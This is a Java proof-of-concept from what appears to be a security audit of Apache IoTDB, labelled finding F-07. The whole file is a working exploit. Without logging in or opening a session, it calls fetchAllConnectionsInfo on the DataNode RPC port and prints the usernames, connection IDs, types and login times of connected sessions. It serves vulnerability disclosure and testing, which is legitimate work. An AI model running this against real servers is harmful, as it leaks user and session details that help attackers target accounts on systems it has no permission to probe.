import org.apache.iotdb.service.rpc.thrift.*;

/**
 * F-07 — Unauthenticated session/connection disclosure via fetchAllConnectionsInfo
 *        (DataNode client RPC, port 6667).
 *
 * ClientRPCServiceImpl.fetchAllConnectionsInfo (:3438) returns SESSION_MANAGER.getAllConnectionInfo()
 * with NO login check — usernames, client IP:port, connection type, login time — to any caller.
 *
 * Rated Medium (information leak; useful for targeting). Password-independent.
 * NOTE: returns records only for sessions that are live at the moment of the call; run it while
 * another session is connected (run-all.sh holds one open).
 *
 * Usage: java F07_ConnectionInfoLeak <host> <6667>
 */
public class F07_ConnectionInfoLeak {
  public static void main(String[] a) throws Exception {
    String host = a.length > 0 ? a[0] : "127.0.0.1";
    int port    = a.length > 1 ? Integer.parseInt(a[1]) : 6667;

    System.out.println("[F-07] " + Common.ts() + "  target=" + host + ":" + port
        + "  (no openSession, no credentials)");
    IClientRPCService.Client c = Common.clientRpc(host, port);
    TSConnectionInfoResp resp = c.fetchAllConnectionsInfo();
    int n = resp.connectionInfoList == null ? 0 : resp.connectionInfoList.size();
    System.out.println("[F-07] fetchAllConnectionsInfo        -> " + n + " connection record(s), UNAUTHENTICATED:");
    if (resp.connectionInfoList != null) {
      for (TSConnectionInfo ci : resp.connectionInfoList) {
        System.out.println("[F-07]   user=" + ci.userName + " type=" + ci.type
            + " connectionId=" + ci.connectionId + " logInTime=" + ci.logInTime);
      }
    }
    System.out.println("[F-07] " + Common.ts()
        + "  Any record above was disclosed with no authentication.");
  }
}
